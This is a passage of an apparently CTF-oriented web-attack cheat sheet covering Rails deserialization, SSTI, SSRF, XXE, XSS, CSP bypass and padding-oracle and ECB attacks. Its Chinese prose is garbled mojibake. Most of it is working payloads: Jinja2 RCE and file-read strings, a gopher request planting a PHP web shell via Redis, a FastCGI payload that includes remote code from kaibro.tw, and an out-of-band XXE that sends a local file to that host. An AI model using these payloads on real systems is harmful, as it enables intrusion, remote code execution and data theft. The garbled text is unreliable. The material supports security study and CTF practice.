åœ¨ERBä¸Šï¼Œå½“resultæˆ–run methodè¢«callæ—¶ï¼Œ@srcçš„stringä¼šè¢«æ‰§è¡Œ

- å¸¸è§ä½¿ç”¨æƒ…å¢ƒï¼š
    - ä»¥Marshalä¸ºCookie Serializeræ—¶ï¼Œè‹¥æœ‰`secret_key`ï¼Œåˆ™å¯ä»¥ä¼ªé€ Cookie
    - ä¹Ÿå¯ä»¥é€è¿‡`DeprecatedInstanceVariableProxy`å»æ‰§è¡ŒERBçš„`result`æ¥RCE
        - å½“`DeprecatedInstanceVariableProxy`è¢«unmarshalï¼Œrails sessionå¯¹ä»–å¤„ç†æ—¶é‡åˆ°ä¸è®¤è¯†çš„methodå°±ä¼šå‘¼å«`method_missing`ï¼Œå¯¼è‡´æ‰§è¡Œä¼ å…¥çš„ERB
        - `@instance.__send__(@method)`

- Cookie Serializer
    - Rails 4.1ä»¥å‰çš„Cookie Serializerä¸ºMarshal
    - Rails 4.1å¼€å§‹ï¼Œé»˜è®¤ä½¿ç”¨JSON

## Ruby/Rails YAML

- CVE-2013-0156
    - æ—§ç‰ˆæœ¬çš„Railsä¸­ï¼Œ`XML`çš„nodeå¯ä»¥è‡ªè®¢typeï¼Œå¦‚æœæŒ‡å®šä¸º`yaml`ï¼Œæ˜¯ä¼šè¢«æˆåŠŸè§£æçš„
    - è‹¥ååºåˆ—åŒ–`!ruby/hash`ï¼Œåˆ™ç›¸å½“äºåœ¨ç‰©ä»¶ä¸Šè°ƒç”¨`obj[key]=val`ï¼Œä¹Ÿå°±æ˜¯`[]=`æ–¹æ³•
    - è€Œè¿™ä¸ª`ActionDispatch::Routing::RouteSet::NamedRouteCollection`ä¸­çš„`[]=`æ–¹æ³•ä¸­ï¼Œæœ‰ä¸€æ¡ä»£ç è·¯å¾„å¯ä»¥eval
    - `define_hash_access`ä¸­å¯ä»¥çœ‹åˆ°`module_eval`ï¼Œé‡Œå¤´çš„`selector`æ¥è‡ª`name`
    - å› ä¸ºä»–è¿˜ä¼šå¯¹`value`è°ƒç”¨`defaults` methodï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨`OpenStruct`æ¥æ„é€ 
        - `å‡½æ•°å=>è¿”å›å€¼`çš„å¯¹åº”å…³ç³»å­˜æ”¾åœ¨`@table`ä¸­
    - Payload:
    ```ruby
    xml = %{  
    <?xml version="1.0" encoding="UTF-8"?>  
    <bingo type='yaml'>  
    ---| !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection  
    'test; sleep(10); test' :  
     !ruby/object:OpenStruct  
      table:  
       :defaults: {}  
    </bingo>

    }.strip
    ```
- CVE-2013-0333
    - Rails 2.3.xå’Œ3.0.xä¸­ï¼Œå…è®¸`text/json`çš„requestè½¬æˆ`YAML`è§£æ
    - `Yaml`åœ¨Rails 3.0.xæ˜¯é¢„è®¾çš„`JSON Backend`
    - å‡ºé—®é¢˜çš„åœ°æ–¹åœ¨äº`YAML.load`å‰çš„`convert_json_to_yaml`ï¼Œä»–ä¸ä¼šæ£€æŸ¥è¾“å…¥çš„JSONæ˜¯å¦åˆæ³•
    - ä¸€æ ·å¯ä»¥é€è¿‡`ActionController::Routing::RouteSet::NamedRouteCollection#define_hash_access`çš„`module_eval`æ¥RCE

## Java Deserialization

- https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet


# SSTI 

Server-Side Template Injection

![img](https://i.imgur.com/GVZeVq6.png)

## Testing
- ` {{ 7*'7' }}`
    - Twig: `49`
    - Jinja2: `7777777`
- `<%= 7*7 %>`
    - Ruby ERB: `49`

## Flask/Jinja2
- Dump all used classes
    - `{{ ''.__class__.__mro__[2].__subclasses__() }}
`
- Read File
    - `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`
- Write File
    - `{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt', 'w').write('Kaibro Yo!')}}`
- RCE
    - `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}`
        - evil config
    - `{{ config.from_pyfile('/tmp/evilconfig.cfg') }}`
        - load config
    - `{{ config['RUNCMD']('cat flag',shell=True) }}`

- RCE (another way)
        - `{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls').read()}}`
- è¿‡æ»¤ä¸­æ‹¬å·
    - `__getitem__`
    - `{{''.__class__.__mro__.__getitem__(2)}}`
        - `{{''.__class__.__mro__[2]}}`
- è¿‡æ»¤`{{` or `}}`
    - ç”¨`{%%}`
    - æ‰§è¡Œç»“æœå¾€å¤–ä¼ 
- è¿‡æ»¤`.`
    - `{{''.__class__}}`
        - `{{''['__class__']}}`
        - `{{''|attr('__class__')}}`
- ç”¨requestç»•
    - `{{''.__class__}}`
        - `{{''[request.args.kaibro]}}&kaibro=__class__`

## AngularJS
- v1.6åç§»é™¤Sandbox
- Payload
    - `{{ 7*7 }}` => 49
    - `{{ this }}`
    - `{{ this.toString() }}`
    - `{{ constructor.toString() }}`
    - `{{ constructor.constructor('alert(1)')() }}` 2.1 v1.0.1-v1.1.5
    - `{{ a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')() }}` 2.1 v1.0.1-v1.1.5
    - `{{ toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)  }}` 2.3 v1.2.19-v1.2.23
    - `{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}` v1.2.24-v1.2.29
    - `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}` v1.3.20
    - `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}` v1.4.0-v1.4.9
    - `{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}` v1.5.0-v1.5.8
    - `{{ [].pop.constructor('alert(1)')() }}` 2.8 v1.6.0-1.6.6

## Vue.js
- `{{constructor.constructor('alert(1)')()}}`
- https://github.com/dotboris/vuejs-serverside-template-xss

## Python
- `%`
    - è¾“å…¥`%(passowrd)s`å³å¯å·åˆ°å¯†ç ï¼š
    ```python
    userdata = {"user" : "kaibro", "password" : "ggininder" }
    passwd  = raw_input("Password: ")
    if passwd != userdata["password"]:
        print ("Password " + passwd + " is wrong")
    ```
- `f`
    - python 3.6
    - example
        - `a="gg"`
        - `b=f"{a} ininder"`
            - `>>> gg ininder`
    - example2
        - `f"{os.system('ls')}"`

## Tool
- https://github.com/epinna/tplmap

---

http://blog.portswigger.net/2015/08/server-side-template-injection.html

# SSRF

## Bypass 127.0.0.1 

```
127.0.0.1
localhost
127.0.1
127.1
0.0.0.0
0.0
0

::1
::127.0.0.1
::ffff:127.0.0.1
::1%1

127.12.34.56 (127.0.0.1/8)
127.0.0.1.xip.io

http://2130706433 (decimal)
http://0x7f000001
http://017700000001
http://0x7f.0x0.0x0.0x1
http://0177.0.0.1
http://0177.01.01.01
http://0x7f.1
http://[::]

```

## Bypass using â’¶ â’· â’¸ â’¹

- `http://â“€â’¶â’¾â’·â“‡â“„.â“‰â“Œ`
- `http://â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ`

## å†…ç½‘IP

- `10.0.0.0/8`
- `172.16.0.0/12`
- `192.168.0.0/16`

## XSPA

- port scan
    - `127.0.0.1:80` => OK
    - `127.0.0.1:87` => Timeout
    - `127.0.0.1:9487` => Timeout

## 302 Redirect Bypass

- ç”¨æ¥ç»•è¿‡protocolé™åˆ¶
- ç¬¬ä¸€æ¬¡SSRFï¼Œç½‘ç«™æœ‰åšæ£€æŸ¥ã€è¿‡æ»¤
- 302è·³è½¬åšç¬¬äºŒæ¬¡SSRFæ²¡æœ‰æ£€æŸ¥

## æœ¬åœ°åˆ©ç”¨

- file protocol
    - `file:///etc/passwd`
    - `file:///proc/self/cmdline`
        - çœ‹ä»–åœ¨è·‘å•¥
    - `file:///proc/self/exe`
        - dump binary
    - `file:///proc/self/environ`
        - è¯»ç¯å¢ƒå˜é‡
    - `curl file://google.com/etc/passwd`
        - æ–°ç‰ˆå·²ä¿®æ‰
        - å®æµ‹libcurl 7.47å¯work
    - JavaåŸç”Ÿå¯åˆ—ç›®å½•
    - Perl/Ruby open Command Injection

## è¿œç¨‹åˆ©ç”¨
- Gopher
    - å¯ä¼ªé€ ä»»æ„TCP
    - `gopher://127.0.0.1:5278/xGG%0d%0aININDER`
- å¸¸è§ä¾‹å­
    - Struts2
        - S2-016
            - `action:`ã€`redirect:`ã€`redirectAction:`
            - `index.do?redirect:${new java.lang.ProcessBuilder('id').start()}`
    - ElasticSearch
        - default port: `9200`
    - Redis
        - default port: `6379`
        - ç”¨SAVEå†™shell
        ```
            FLUSHALL 
            SET myshell "<?php system($_GET['cmd']) ?>"
            CONFIG SET DIR /www 
            CONFIG SET DBFILENAME shell.php 
            SAVE
            QUIT
        ```
        - URLencoded payload:
        `gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20myshell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20DIR%20%2fwww%2f%0D%0ACONFIG%20SET%20DBFILENAME%20shell.php%0D%0ASAVE%0D%0AQUIT`
    - FastCGI
        - default port: 9000
        - example
            - Discuz Pwn
                - 302.php: `<?php
header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%00%00%00%01%04Zh%00%8b%00%00%0E%03REQUEST_METHODGET%0F%0FSCRIPT_FILENAME/www//index.php%0F%16PHP_ADMIN_VALUEallow_url_include%20=%20On%09%26PHP_VALUEauto_prepend_file%20=%20http://kaibro.tw/x%01%04Zh%00%00%00%00%01%05Zh%00%00%00%00" );`
                - x: `<?php system($_GET['cmd']); ?>`
                - visit: `/forum.php?mod=ajax&action=downremoteimg&message=[img]http://kaibro.tw/302.php?.jpg[/img]`
    - MySQL
        - æ— å¯†ç è®¤è¯å¯ä»¥SSRF
        - MySQL Clientä¸Serveräº¤äº’ä¸»è¦åˆ†ä¸¤é˜¶æ®µ
            - Connection Phase
            - Command Phase
        - `gopher://127.0.0.1:3306/_<PAYLOAD>`

    - Docker 
        - Remote apiæœªæˆæƒè®¿é—®
            - å¼€ä¸€ä¸ªcontainerï¼ŒæŒ‚è½½/root/ï¼Œå†™ssh key
            - å†™crontabå¼¹shell

    - ImageMagick - CVE-2016-3718
        - å¯ä»¥å‘é€HTTPæˆ–FTP request
        - payload: ssrf.mvg
        ```
        push graphic-context
        viewbox 0 0 640 480
        fill 'url(http://example.com/)'
        pop graphic-context
        ```
        - `$ convert ssrf.mvg out.png`
    

## CRLF injection

### SMTP

SECCON 2017 SqlSRF:

`127.0.0.1 %0D%0AHELO sqlsrf.pwn.seccon.jp%0D%0AMAIL FROM%3A %3Ckaibrotw%40gmail.com%3E%0D%0ARCPT TO%3A %3Croot%40localhost%3E%0D%0ADATA%0D%0ASubject%3A give me flag%0D%0Agive me flag%0D%0A.%0D%0AQUIT%0D%0A:25/`

## FingerPrint

- dict
```
dict://evil.com:5566

$ nc -vl 5566
Listening on [0.0.0.0] (family 0, port 5278)
Connection from [x.x.x.x] port 5566 [tcp/*] accepted (family 2, sport 40790)
CLIENT libcurl 7.35.0

-> libcurl version
```
- sftp
```
sftp://evil.com:5566

$ nc -vl 5566
Listening on [0.0.0.0] (family 0, port 5278)
Connection from [x.x.x.x] port 5278 [tcp/*] accepted (family 2, sport 40810)
SSH-2.0-libssh2_1.4.2

-> ssh version
```

- Content-Length
    - é€è¶…å¤§Content-length
    - è¿çº¿hangä½åˆ¤æ–­æ˜¯å¦ä¸ºHTTP Service

## UDP

- tftp
    - `tftp://evil.com:5566/TEST`
    - syslog

---

SSRF Bible:

https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit

Testing Payload:

https://github.com/cujanovic/SSRF-Testing


# XXE

## å†…éƒ¨å®ä½“

```xml
<!DOCTYPE kaibro[
    <!ENTITY param "hello">
]>
<root>&param;</root>
```

## å¤–éƒ¨å®ä½“

- `libxml2.9.0`ä»¥åï¼Œé¢„è®¾ä¸è§£æå¤–éƒ¨å®ä½“
- `simplexml_load_file()`æ—§ç‰ˆæœ¬ä¸­é¢„è®¾è§£æå®ä½“ï¼Œä½†æ–°ç‰ˆè¦æŒ‡å®šç¬¬ä¸‰ä¸ªå‚æ•°`LIBXML_NOENT`
- `SimpleXMLElement` is a class in PHP
    - http://php.net/manual/en/class.simplexmlelement.php

```xml
<!DOCTYPE kaibro[
    <!ENTITY xxe SYSTEM "http://kaibro.tw/xxe.txt">
]>
<root>&xxe;</root>
```

```xml
<!DOCTYPE kaibro[
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### XXE on Windows

```xml
<!DOCTYPE kaibro[
    <!ENTITY xxe SYSTEM "\\12.34.56.78">
]>
<root>&xxe;</root>
```

## å‚æ•°å®ä½“

```xml
<!DOCTYPE kaibro[
    <!ENTITY % remote SYSTEM "http://kaibro.tw/xxe.dtd">
    %remote;
]>
<root>&b;</root>
```
xxe.dtd: `<!ENTITY b SYSTEM "file:///etc/passwd">`


## Out of Band (OOB) XXE

- Blind æ— å›æ˜¾

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/xxe/test.php">
<!ENTITY % remote SYSTEM "http://kaibro.tw/xxe.dtd">
%remote;
%all;
%send;
]>
```

xxe.dtd:

```xml
<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://kaibro.tw/?a=%file;'>">
```

## DoS

- Billion Laugh Attack

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

## å…¶å®ƒ

- DOCX
- XLSX
- PPTX
- PDF
- https://github.com/BuffaloWill/oxml_xxe

# XSS

## Basic Payload

- `<script>alert(1)</script>`
- `<svg/onload=alert(1)>`
- `<img src=# onerror=alert(1)>`
- `<a href="javascript:alert(1)">g</a>`
- `<input type="text" value="g" onmouseover="alert(1)" />`
- `<iframe src="javascript:alert(1)"></iframe>`
- ...

## Testing

- `<script>alert(1)</script>`
- `'"><script>alert(1)</script>`
- `<img/src=@ onerror=alert(1)/>`
- `'"><img/src=@ onerror=alert(1)/>`
- `' onmouseover=alert(1) x='`
- `" onmouseover=alert(1) x="`
- ``` `onmouseover=alert(1) x=` ```
- `javascript:alert(1)//`
- ....

## ç»•è¿‡

- `//`(javascriptæ³¨è§£)è¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥åˆ©ç”¨ç®—æ•°è¿ç®—ç¬¦ä»£æ›¿
    - `<a href="javascript:alert(1)-abcde">xss</a>`
- HTMLç‰¹æ€§
    - ä¸åˆ†å¤§å°å†™
        - `<ScRipT>`
        - `<img SrC=#>`
    - å±æ€§å€¼
        - `src="#"`
        - `src='#'`
        - `src=#`
        - ```src=`#` ``` (IE)
- ç¼–ç ç»•è¿‡
    - `<svg/onload=alert(1)>`
        - `<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>` (16è¿›åˆ¶) (åˆ†å·å¯å»æ‰)
- ç»•ç©ºç™½
    - `<img/src='1'/onerror=alert(0)>`
## å…¶ä»–

- ç‰¹æ®Šæ ‡ç±¤
    - ä»¥ä¸‹æ ‡ç±¤ä¸­çš„è„šæœ¬æ— æ³•æ‰§è¡Œ
    - `<title>`, `<textarea>`, `<iframe>`, `<plaintext>`, `<noscript>`...

- ä¼ªåè®®
    - javascript:
        - `<a href=javascript:alert(1) >xss</a>`
    - data:
        - `<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>xss</a>`
- Javascriptè‡ªè§£ç æœºåˆ¶
    - `<input type="button" onclick="document.write('&lt;img src=@ onerror=alert(1) /&gt;')" />`
    - ä¼šæˆåŠŸ`alert(1)`ï¼Œå› ä¸ºjavascriptä½äºHTMLä¸­ï¼Œåœ¨æ‰§è¡Œjavascriptå‰ä¼šå…ˆè§£ç HTMLç¼–ç 
    - ä½†è‹¥æ˜¯åŒ…åœ¨`<script>`ä¸­çš„javascriptï¼Œä¸ä¼šè§£ç HTMLç¼–ç 
    - æ­¤ç¼–ç ä¸ºHTML entityå’Œ`&#xH;`(hex), `&#D;`(dec)å½¢å¼

- Javascriptä¸­æœ‰ä¸‰å¥—ç¼–ç /è§£ç å‡½æ•°
    - escape/unescape
    - encodeURI/decodeURI
    - encodeURIComponent/decodeURICompinent

- ä¸€äº›alert(document.domain)çš„æ–¹æ³•
    - `(alert)(document.domain);`
    - `al\u0065rt(document.domain);`
    - `al\u{65}rt(document.domain);`
    - `window['alert'](document.domain);`
    - `alert.call(null,document.domain);`
    - `alert.bind()(document.domain);`
    - https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309

- Some Payload
    - `<svg/onload=alert(1);alert(2)>`
    - `<svg/onload="alert(1);alert(2)">`
    - `<svg/onload="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;;alert(2)">`
        - `;;`æ”¹æˆ`;`ä¼šå¤±è´¥
        - åŒå¼•å·å¯å»æ‰
        - å¯10è¿›åˆ¶, 16è¿›åˆ¶æ··åˆ
    - `<svg/onload=\u0061\u006c\u0065\u0072\u0074(1)>`
        - \uå½¢å¼åªèƒ½ç”¨åœ¨javascriptï¼Œä¾‹å¦‚onloadçš„aæ”¹æˆ\u0061ä¼šå¤±è´¥
    - `<title><a href="</title><svg/onload=alert(1)>`
        - titleä¼˜å…ˆæƒè¾ƒå¤§ï¼Œç›´æ¥ä¸­æ–­å…¶ä»–æ ‡ç±¤
    - `<svg><script>prompt&#40;1)</script>`
        - å› ä¸º`<svg>`ï¼ŒHTML Entitiesä¼šè¢«è§£æ
        - å»æ‰`<svg>`ä¼šå¤±è´¥ï¼Œ`<script>`ä¸ä¼šè§£æEntities
    - `<? foo="><script>alert(1)</script>">`
    - `<! foo="><script>alert(1)</script>">`
    - `</ foo="><script>alert(1)</script>">`
    - `<% foo="><script>alert(1)</script>">`

- Markdown XSS
    - `[a](javascript:prompt(document.cookie))`
    - `[a](j a v a s c r i p t:prompt(document.cookie))`
    - `[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)`
    - `[a](javascript:window.onerror=alert;throw%201)`
    - ...

- æ–‡ä»¶XSS
    - Example: PlaidCTF 2018 wave XSS
    - ä¸Šä¼ .waveæ¡£ (ä¼šæ£€æŸ¥signatures)
      ```
        RIFF`....WAVE...` 
        alert(1); 
        function RIFF(){}
      ```
        - å˜æˆåˆæ³•çš„jsè¯­æ³•
        - waveåœ¨apache mime typeä¸­æ²¡æœ‰è¢«å®šä¹‰
        - `<script src="uploads/this_file.wave">`

## CSP evaluator

https://csp-evaluator.withgoogle.com/

## Bypass CSP

- base
    - æ”¹å˜èµ„æºè½½å…¥çš„åŸŸï¼Œå¼•å…¥æ¶æ„çš„js
    - `<base href ="http://kaibro.tw/">`
    - RCTF 2018 - rBlog

- script nonce
    
    ```
     <p>å¯æ§å†…å®¹<p>
     <script src="xxx" nonce="AAAAAAAAAAA"></script>
    ```

    æ’å…¥`<script src="http//kaibro.tw/uccu.js" a="`

    ```
     <p><script src="http//kaibro.tw/uccu.js" a="<p>
     <script src="xxx" nonce="AAAAAAAAAAA"></script>
    ```

- Script Gadget
    - https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
    - is an **existing** JS code on the page that may be used to bypass mitigations
    - Bypassing CSP strict-dynamic via Bootstrap
        - `<div data-toggle=tooltip data-html=true title='<script>alert(1)</script>'></div>`
    - Bypassing sanitizers via jQuery Mobile
        - `<div data-role=popup id='--><script>alert(1)</script>'></div>`
    - Bypassing NoScript via Closure (DOM clobbering)
        - `<a id=CLOSURE_BASE_PATH href=http://attacker/xss></a>`
    - Bypassing ModSecurity CRS via Dojo Toolkit
        - `<div data-dojo-type="dijit/Declaration" data-dojo-props="}-alert(1)-{">`
    - Bypassing CSP unsafe-eval via underscore templates
        - `<div type=underscore/template> <% alert(1) %> </div>`
    - 0CTF 2018 - h4xors.club2
- google analytics ea
    - ea is used to log actions and can contain arbitrary string
    - Google CTF 2018 - gcalc2


## Online Encoding / Decoding
- http://monyer.com/demo/monyerjs/

## JSFuck
- http://www.jsfuck.com/

## aaencode / aadecode
- http://utf-8.jp/public/aaencode.html
- https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html


## RPO

- http://example.com/a%2findex.php
    - æµè§ˆå™¨ä¼šæŠŠ`a%2findex.php`å½“æˆä¸€ä¸ªæ¡£æ¡ˆ
    - Web Serveråˆ™ä¼šæ­£å¸¸è§£ææˆ`a/index.php`
    - æ‰€ä»¥å½“ä½¿ç”¨**ç›¸å¯¹è·¯å¾„**è½½å…¥cssæ—¶ï¼Œå°±å¯ä»¥é€è¿‡è¿™ç§æ–¹å¼è®©æµè§ˆå™¨è§£æåˆ°å…¶ä»–å±‚ç›®å½•ä¸‹çš„æ¡£æ¡ˆ
        - å¦‚æœè¯¥æ¡£æ¡ˆå†…å®¹å¯æ§ï¼Œåˆ™æœ‰æœºä¼šXSS
    - ä¸¾ä¾‹ï¼š 
        - `/test.php`ä¸­æœ‰`<link href="1/" ...>`
        - å¦æœ‰`/1/index.php`ç»™`?query=`å‚æ•°ï¼Œä¼šç›´æ¥è¾“å‡ºè¯¥å‚æ•°å†…å®¹
        - è®¿é—®`/1%2f%3Fquery={}*{background-color%3Ared}%2f..%2f../test.php`å°±ä¼šè®©èƒŒæ™¯å˜çº¢è‰²
            - Server: `/test.php`
            - Browser: `/1%2f%3Fquery={}*{background-color%3Ared}%2f..%2f../test.php`
                - CSSä¼šè½½å…¥`/1/?query={}*{background-color:red}/../../1/`
            - CSSè¯­æ³•å®¹é”™ç‡å¾ˆé«˜
        
# å¯†ç å­¦

## PRNG

- php 7.1.0å `rand()`å’Œ`srand()`å·²ç»ç­‰åŒ`mt_rand()`å’Œ`mt_srand()`
    - æµ‹è¯•ç»“æœï¼šhttps://3v4l.org/PIUEo

- php > 4.2.0 ä¼šè‡ªåŠ¨å¯¹`srand()`å’Œ`mt_srand()`æ’­ç§
    - åªè¿›è¡Œä¸€æ¬¡seedï¼Œä¸ä¼šæ¯æ¬¡`rand()`éƒ½seed
    
- å¯ä»¥é€šè¿‡å·²çŸ¥çš„randomç»“æœï¼Œå»æ¨ç®—éšæœºæ•°ç§å­ï¼Œç„¶åå°±å¯ä»¥æ¨ç®—æ•´ä¸ªéšæœºæ•°åºåˆ—
- å®é™…åº”ç”¨ä¸Šå¯èƒ½ä¼šç¢°åˆ°è¿ä¸Šçš„ä¸æ˜¯åŒä¸ªprocessï¼Œå¯ä»¥ç”¨`Keep-Alive
`æ¥ç¡®ä¿è¿ä¸ŠåŒä¸ªphp process(åªä¼šseedä¸€æ¬¡)
- 7.1ä»¥å‰`rand()`ä½¿ç”¨libc random()ï¼Œå…¶æ ¸å¿ƒä¸ºï¼š`
state[i] = state[i-3] + state[i-31]`
    - æ‰€ä»¥åªè¦æœ‰31ä¸ªè¿ç»­éšæœºæ•°å°±èƒ½é¢„æµ‹æ¥ä¸‹æ¥çš„éšæœºæ•°
    - åæ¥`rand()` aliasæˆ`mt_rand()`ï¼Œæ¡ç”¨çš„æ˜¯`Mersenne Twister`ç®—æ³•
- Example: HITCON 2015 - Giraffeâ€™s Coffee


## ECB mode

### Cut and Paste Attack

- æ¯ä¸ªBlockåŠ å¯†æ–¹å¼éƒ½ä¸€æ ·ï¼Œæ‰€ä»¥å¯ä»¥æŠŠBlockéšæ„æ’åˆ—
- ä¸¾ä¾‹ï¼š `user=kaibro;role=user`
    - å‡è®¾Blocké•¿åº¦ä¸º8
    - æ„é€ ä¸€ä¸‹user: (`|`ç”¨æ¥åŒºåˆ†Block)
        - `user=aaa|admin;ro|le=user`
        - `user=aaa|aa;role=|user`
    - æ’åˆ—ä¸€ä¸‹ï¼š(ä¸Šé¢æ¯å—åŠ å¯†åçš„Blockéƒ½å·²çŸ¥)
        - `user=aaa|aa;role=|admin;ro`
- Example: AIS3 2017 pre-exam

### Encryption Oracle Attack

- `ECB(K, A + B + C)`çš„è¿ç®—ç»“æœå¯çŸ¥
    - Bå¯æ§
    - K, A, CæœªçŸ¥
- Cçš„å†…å®¹å¯ä»¥é€è¿‡ä»¥ä¸‹æ–¹æ³•çˆ†å‡ºæ¥ï¼š
    - æ‰¾å‡ºæœ€å°çš„é•¿åº¦L
    - ä½¿å¾—å°†Bæ”¹æˆLä¸ªaï¼Œè¯¥æ®µpatternåˆšå¥½é‡å¤ä¸¤æ¬¡
        - `...bbbb bbaa aaaa aaaa cccc ...`
        - `...???? ???? 5678 5678 ???? ...`
    - æ”¹æˆL-1ä¸ªaï¼Œå¯å¾—åˆ°`ECB(K, "aa...a" + C[0])`è¿™ä¸ªBlockçš„å†…å®¹
    - C[0]å¯çˆ†ç ´æ±‚å¾—ï¼Œåé¢ä¹Ÿä¾æ­¤ç±»æ¨
- å¸¸è§å‘ç”Ÿåœºæ™¯ï¼šCookie

## CBC mode

### Bit Flipping Attack

- å‡è®¾IVä¸ºAã€ä¸­é—´å€¼ä¸ºB (Block Decryptåç»“æœ)ã€æ˜æ–‡ä¸ºC
- CBC modeè§£å¯†æ—¶ï¼Œ`A XOR B = C`
- è‹¥è¦ä½¿è¾“å‡ºæ˜æ–‡å˜`X`
- ä¿®æ”¹Aä¸º`A XOR C XOR X`
- åˆ™åŸæœ¬å¼å­å˜æˆ`(A XOR C XOR X) XOR B = X`

### Padding Oracle Attack

- `PKCS#7`
    - Paddingæ–¹å¼ï¼šä¸è¶³xä¸ªByteï¼Œå°±è¡¥xä¸ªx
        - ä¾‹å¦‚ï¼šBlocké•¿åº¦8
        - `AA AA AA AA AA AA AA 01`
        - `AA AA AA AA AA AA 02 02`
        - `AA AA AA AA AA 03 03 03`
        - ...
        - `08 08 08 08 08 08 08 08`
    - åœ¨å¸¸è§æƒ…å†µä¸‹ï¼Œå¦‚æœè§£å¯†å‡ºæ¥å‘ç°Paddingæ˜¯çƒ‚çš„ï¼Œä¼šå–·Exceptionæˆ–Error
        - ä¾‹å¦‚ï¼šHTTP 500 Internal Server Error
        - é¡»æ³¨æ„ä»¥ä¸‹è¿™ç±»æƒ…å†µï¼Œä¸ä¼šå–·é”™ï¼š
            - `AA AA AA AA AA AA 01 01`
            - `AA AA 02 02 02 02 02 02`
- åŸç†ï¼š
    - CBC modeä¸‹ï¼Œå‰ä¸€å—å¯†æ–‡ä¼šå½“ä½œå½“å‰è¿™å—çš„IVï¼ŒåšXOR
    - å¦‚æœæ„é€ `A||B`å»è§£å¯† (A, Bæ˜¯å¯†æ–‡Block)
    - æ­¤æ—¶ï¼ŒAä¼šè¢«å½“ä½œBçš„IVï¼ŒBä¼šè¢«è§£æˆ`D(B) XOR A`
    - å¯ä»¥é€è¿‡è°ƒæ•´Aï¼Œä½¿å¾—Paddingå˜åˆæ³•ï¼Œå°±å¯ä»¥å¾—åˆ°`D(B)`çš„å€¼
        - ä¾‹å¦‚ï¼šè¦è§£æœ€å1 Byte
        - æƒ³åŠæ³•è®©æœ€åè§£å‡ºæ¥å˜æˆ`01`ç»“å°¾
        - è¿æ°”ä¸å¥½æ—¶ï¼Œå¯èƒ½åˆšå¥½ç¢°åˆ°`02 02`ç»“å°¾ï¼Œå¯ä»¥è°ƒæ•´ä¸€ä¸‹Aå€’æ•°ç¬¬2 Byte
        - `D(B)[-1] XOR A[-1] = 01`
        - `D(B)[-1] = A[-1] XOR 01`
        - æœ‰æœ€å1 Byteå°±å¯ä»¥ä¾æ­¤ç±»æ¨ï¼Œè°ƒæ•´å€’æ•°ç¬¬2 Byte
    - `D(B) XOR C`å°±èƒ½å¾—åˆ°æ˜æ–‡ (Cä¸ºå‰ä¸€å—çœŸæ­£çš„å¯†æ–‡)



## Length Extension Attack

- å¾ˆå¤šhashç®—æ³•éƒ½å¯èƒ½å­˜åœ¨æ­¤æ”»å‡»ï¼Œä¾‹å¦‚`md5`, `sha1`, `sha256`...
- ä¸»è¦æ˜¯å› ä¸ºä»–ä»¬éƒ½ä½¿ç”¨Merkle-Damgard hash construction
- ä¼šä¾ç…§64 Byteåˆ†ç»„ï¼Œä¸è¶³ä¼špadding
    - 1 byteçš„`0x80`+ä¸€å †`0x00`+8 bytesçš„`é•¿åº¦`
- IVæ˜¯å†™æ­»çš„ï¼Œä¸”æ¯ä¸€ç»„è¾“å‡ºç»“æœä¼šå½“ä¸‹ä¸€ç»„çš„è¾“å…¥
- æ”»å‡»æ¡ä»¶ï¼š (è¿™é‡Œmd5æ¢æˆsha1, sha256...ä¹Ÿé€šç”¨)
    - å·²çŸ¥`md5(secret+message)`
    - å·²çŸ¥`secreté•¿åº¦`
    - å·²çŸ¥`messageå†…å®¹`
